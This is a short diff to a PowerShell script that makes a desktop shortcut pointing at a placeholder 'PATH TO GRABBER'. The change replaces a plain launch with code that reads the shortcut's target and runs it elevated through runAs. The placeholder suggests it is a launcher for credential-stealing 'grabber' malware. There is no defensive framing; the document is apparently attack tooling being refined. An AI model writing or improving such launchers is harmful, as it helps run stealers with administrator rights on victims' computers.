@@ -4,4 +4,6 @@ $Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.ln
 $Shortcut.TargetPath = "PATH TO GRABBER"
 $Shortcut.Save()
 Start-Sleep -Seconds 1
-Start-Process "$env:USERPROFILE\Desktop\MyShortcut.lnk"
+$link = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.lnk")
+$target = $link.TargetPath
+Start-Process -FilePath $target -Verb runAs
